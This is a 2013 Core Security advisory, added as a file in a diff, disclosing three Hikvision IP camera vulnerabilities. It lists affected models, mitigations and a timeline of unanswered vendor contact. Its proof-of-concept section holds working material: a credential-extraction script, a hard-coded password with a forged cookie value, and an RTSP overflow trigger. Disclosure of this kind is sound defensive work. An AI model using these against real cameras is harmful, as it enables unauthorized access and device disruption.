@@ -1,0 +1,333 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Hikvision IP Cameras Multiple Vulnerabilities
+
+
+1. *Advisory Information*
+
+Title: Hikvision IP Cameras Multiple Vulnerabilities
+Advisory ID: CORE-2013-0708
+Advisory URL:
+http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities
+Date published: 2013-08-06
+Date of last update: 2013-08-06
+Vendors contacted: Hikvision
+Release mode: User release
+
+
+2. *Vulnerability Information*
+
+Class: Input validation error [CWE-20], Use of Hard-coded Credentials
+[CWE-798], Buffer overflow [CWE-119]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-4975, CVE-2013-4976, CVE-2013-4977
+
+
+3. *Vulnerability Description*
+
+Multiple vulnerabilities have been found in Hikvision IP camera
+DS-2CD7153-E [1] (and potentially other cameras sharing the affected
+firmware [2]) that could allow a remote attacker:
+
+   1. [CVE-2013-4975] To obtain the admin password from a non-privileged
+user account.
+   2. [CVE-2013-4976] To bypass the anonymous user authentication using
+hard-coded credentials (even if the built-in anonymous user account was
+explicitly disabled).
+   3. [CVE-2013-4977] To execute arbitrary code without authentication
+by exploiting a buffer overflow in the RTSP packet handler.
+
+
+4. *Vulnerable Packages*
+
+   . Hikvision-DS-2CD7153-E IP camera with firmware v4.1.0 b130111 (Jan
+2013).
+   . Other devices based on the same firmware [2] are probably affected
+too, but they were not checked.
+
+
+5. *Vendor Information, Solutions and Workarounds*
+
+There was no official answer from Hikvision after several attempts (see
+[Sec. 8]); contact vendor for further information. Some mitigation
+actions may be:
+
+   . Do not expose the camera to internet unless absolutely necessary.
+   . Have at least one proxy filtering HTTP requests to
+'/PSIA/System/ConfigurationData'.
+   . Have at least one proxy filtering the 'Range' parameter in RTSP
+requests.
+
+
+6. *Credits*
+
+   . [CVE-2013-4975] was discovered and researched by Alberto Solino
+from Core Security.
+   . [CVE-2013-4976] was discovered and researched by Alejandro
+Rodriguez from Core Exploit QA Team.
+   . [CVE-2013-4977] was discovered Anibal Sacco. Analysis and research
+by Anibal Sacco and Federico Muttis from Core Exploit Writers Team.
+   . The publication of this advisory was coordinated by Fernando
+Miranda from Core Advisories Team.
+
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *Privilege Escalation through ConfigurationData Request*
+
+[CVE-2013-4975] The following script allows obtaining the administrator
+password by requesting the camera's configuration data and breaking its
+trivial encryption. A valid user account is needed to launch the attack.
+
+/-----
+import urllib2
+import base64
+import argparse
+import sys
+
+def decrypt(config):
+    # Important: We're assuming the last 4 bytes of the file's plaintext
+are        
+    # zero, hence there we have the key. There are other easy ways to
+    # calculate this tho.
+    print '[*] Decrypting config'
+    key = config[-4:]
+    plaintext = ''
+    for i in range(len(config)/4):
+        for j in range(4):
+            plaintext += chr(ord(config[i*4+j]) ^ ord(key[j]))
+    return plaintext
+
+def attack(target, username, password, output):
+    base_url = 'http://' + target + '/PSIA/System/ConfigurationData'
+    headers = { 'Authorization': 'Basic ' + base64.b64encode('%s:%s'
+%(username,password)) }
+    print '[*] Attacking %s ' % target
+    req = urllib2.Request(base_url, None, headers)
+    try:
+        response = urllib2.urlopen(req)
+        config = response.read()
+    except Exception, e:
+        print e
+        return
+    plaintext = decrypt(config)
+    print '[*] Writing output file %s' % output
+    f = open(output, 'w')
+    f.write(plaintext)
+    f.close()
+    user = plaintext[0x45A0:0x45A0+32]
+    pwd  = plaintext[0x45C0:0x45C0+16]
+    print 'Probably the admin user is %s and the password is %s' %
+(user, pwd)
+    print "If it doesn't make any sense, just do a strings of the output
+file"
+    
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('target', action = 'store', help = 'target host
+to attack')
+    parser.add_argument('username', action = 'store', help = 'username
+to be used to authenticate against target')
+    parser.add_argument('password', action = 'store', help = "username's
+password")
+    parser.add_argument('output', action = 'store', help = "filename to
+write the plaintext config")
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+    options = parser.parse_args()
+    attack(options.target, options.username, options.password,
+options.output)
+-----/
+
+
+7.2. *Anonymous User Authentication Bypass*
+
+[CVE-2013-4976] The camera has a built-in anonymous account intended for
+guest users, but even when the feature is disabled it could be bypassed
+due to the usage of hardcoded credentials:
+
+/-----
+user: anonymous
+password: \177\177\177\177\177\177        
+-----/
+
+The bypass cannot be used directly through the login form but rather by
+forging a cookie:
+
+   1. Load the login page to generate the initial cookies of the
+camera's webapp.
+   2. Use your preferred tool (for example Firebug on Firefox) to create
+a cookie with the name 'userInfoXX' (replace XX with the port where the
+webserver is running i.e. 'userInfo80'), path '/' and value
+'YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw=='; this is the tuple
+'user:pass' encoded in base64 explained above.
+   3. Request the URI 'http:/<ipcam>/doc/pages/main.asp', a page that
+should not be accessed without authentication if the anonymous user is
+disabled.
+There are several references to those hardcoded credentials in the cgis,
+but in particular the following snippet was found in
+'/doc/pages/scripts/login.js'::
+
+/-----
+107: function DoLogin(){
+(...)
+166:
+$.cookie('userInfo'+m_lHttpPort,m_szUserPwdValue==""?Base64.encode("anonymous:\177\177\177\177\177\177"   
+):m_szUserPwdValue);
+(...)
+-----/
+
+This bypass is not completely useful per se since all the interesting
+requests are actually handled by the PSIA (Physical Security
+Interoperability Alliance's) API. Nevertheless, if it is ever combined
+with a privilege escalation it would allow remote attacker to control
+the camera without proper credentials.
+
+
+7.3. *Buffer Overflow in the RTSP Packet Handler*
+
+[CVE-2013-4977] The following Python script sends a specially crafted
+packet that triggers a buffer overrun condition when handling the
+'Range' parameter of a RTSP transaction. As a result, the process
+handling the communication crashes and the Watchdog service issues a
+full restart. No authentication is required to exploit this
+vulnerability and it would possible lead to a remote code execution.
+
+/-----
+import socket
+
+HOST = '192.168.1.100'
+PORT = 554              
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+trigger_pkt =  "PLAY rtsp://%s/ RTSP/1.0\r\n" % HOST
+trigger_pkt += "CSeq: 7\r\n"
+trigger_pkt += "Range:
+npt=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9aLSaLSaLS\r\n"
+trigger_pkt += "User-Agent: VLC media player (LIVE555 Streaming Media
+v2010.02.10)\r\n\r\n"
+
+s.sendall(trigger_pkt)
+print "Packet sent"
+data = s.recv(1024)
+print 'Received', repr(data), "\r\n"
+s.close()    
+-----/
+
+
+8. *Report Timeline*
+
+. 2013-07-08:
+Core attempts to report the vulnerability using the Hikvision official
+contact addresses [3]. No reply received.
+
+. 2013-07-15:
+Core attempts to contact vendor.
+
+. 2013-07-22:
+Core attempts to contact vendor.
+
+. 2013-07-30:
+Core attempts to contact vendor.
+
+. 2013-08-06:
+Advisory CORE-2013-0708 published as 'user release'.
+
+
+9. *References*
+
+[1] Hikvision DS-2CD7153-E Network Mini Dome Camera,
+http://www.hikvision.com/en/products_show.asp?id=506.
+[2] Hikvision IP cameras using firmware v4.1.0 b130111:
+ DS-2CD833F-E DS-2CD893PF-E DS-2CD893PFWD-E DS-2CD893NF-E
+DS-2CD893NFWD-E DS-2CD863PF-E DS-2CD863NF-E DS-2CD864F-E DS-2CD864FWD-E
+DS-2CD853F-E DS-2CD855F-E DS-2CD854F-E DS-2CD854FWD-E DS-2CD883F-E
+DS-2CD733F-E DS-2CD733F-EZ DS-2CD793PF-E DS-2CD793PF-EZ DS-2CD793PFWD-E
+DS-2CD793PFWD-EZ DS-2CD793NF-E DS-2CD793NF-EZ DS-2CD793NFWD-E
+DS-2CD793NFWD-EZ DS-2CD763PF-E DS-2CD763PF-EZ DS-2CD763NF-E
+DS-2CD763NF-EZ DS-2CD764F-E DS-2CD764F-EZ DS-2CD764FWD-E DS-2CD764FWD-EZ
+DS-2CD753F-E DS-2CD753F-EZ DS-2CD755F-E DS-2CD755F-EZ DS-2CD754F-E
+DS-2CD754F-EZ DS-2CD754FWD-E DS-2CD783F-E DS-2CD783F-EZ DS-2CD733F-EI
+DS-2CD733F-EIZ DS-2CD793PF-EI DS-2CD793PF-EIZ DS-2CD793PFWD-EI
+DS-2CD793PFWD-EIZ DS-2CD793NF-EI DS-2CD793NF-EIZ DS-2CD793NFWD-EI
+DS-2CD793NFWD-EIZ DS-2CD763PF-EI DS-2CD763PF-EIZ DS-2CD763NF-EI
+DS-2CD763NF-EIZ DS-2CD764F-EI DS-2CD764F-EIZ DS-2CD764FWD-EI
+DS-2CD764FWD-EIZ DS-2CD753F-EI DS-2CD753F-EIZ DS-2CD755F-EI
+DS-2CD755F-EIZ DS-2CD754F-EI DS-2CD754F-EIZ DS-2CD754FWD-EI
+DS-2CD783F-EI DS-2CD783F-EIZ DS-2CD7233F-EZ DS-2CD7233F-EZH
+DS-2CD7233F-EZS DS-2CD7233F-EZHS DS-2CD7293PF-EZ DS-2CD7293PF-EZH
+DS-2CD7293PFWD-EZ DS-2CD7293PFWD-EZH DS-2CD7293NF-EZ DS-2CD7293NF-EZH
+DS-2CD7293NFWD-EZ DS-2CD7293NFWD-EZH DS-2CD7263PF-EZ DS-2CD7263PF-EZH
+DS-2CD7263PF-EZS DS-2CD7263PF-EZHS DS-2CD7263NF-EZ DS-2CD7263NF-EZH
+DS-2CD7263NF-EZS DS-2CD7263NF-EZHS DS-2CD7264FWD-EZ DS-2CD7264FWD-EZH
+DS-2CD7253F-EZ DS-2CD7253F-EZH DS-2CD7253F-EZS DS-2CD7253F-EZHS
+DS-2CD7255F-EZ DS-2CD7255F-EZH DS-2CD7254F-EZ DS-2CD7254F-EZH
+DS-2CD7254F-EZS DS-2CD7254F-EZHS DS-2CD7233F-EIZ DS-2CD7233F-EIZH
+DS-2CD7233F-EIZS DS-2CD7233F-EIZHS DS-2CD7293PF-EIZ DS-2CD7293PF-EIZH
+DS-2CD7293PFWD-EIZ DS-2CD7293PFWD-EIZH DS-2CD7293NF-EIZ DS-2CD7293NF-EZH
+DS-2CD7293NFWD-EIZ DS-2CD7293NFWD-EZH DS-2CD7263PF-EIZ DS-2CD7263PF-EIZH
+DS-2CD7263PF-EIZH DS-2CD7263PF-EIZHS DS-2CD7263NF-EIZ DS-2CD7263NF-EIZH
+DS-2CD7263NF-EIZH DS-2CD7263NF-EIZHS DS-2CD7264FWD-EIZ
+DS-2CD7264FWD-EIZH DS-2CD7253F-EIZ DS-2CD7253F-EIZH DS-2CD7253F-EIZS
+DS-2CD7253F-EIZHS DS-2CD7255F-EIZ DS-2CD7255F-EIZH DS-2CD7254F-EIZ
+DS-2CD7254F-EIZH DS-2CD7254F-EIZH DS-2CD7254F-EIZHS DS-2CD7133-E
+DS-2CD8133F-E DS-2CD8133F-EI DS-2CD7164-E DS-2CD7153-E DS-2CD8153F-E
+DS-2CD8153F-EI DS-2CD8233F-E DS-2CD8233F-ES DS-2CD8264F-E
+DS-2CD8264FWD-E DS-2CD8264FWD-ES DS-2CD8253F-E DS-2CD8253F-ES
+DS-2CD8255F-E DS-2CD8254F-E DS-2CD8254F-ES DS-2CD8283F-E DS-2CD8283F-ES
+DS-2CD8233F-EI DS-2CD8233F-EIS DS-2CD8264F-EI DS-2CD8264FWD-EI
+DS-2CD8264FWD-EIS DS-2CD8253F-EI DS-2CD8253F-EIS DS-2CD8255F-EI
+DS-2CD8254F-EI DS-2CD8254F-EIS DS-2CD8283F-EI DS-2CD8283F-EIS
+DS-2CD8433F-EI DS-2CD8464F-EI.
+[3] Hikvision contact page,
+http://www.hikvision.com/En/US/contactHikvision.asp.
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+11. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
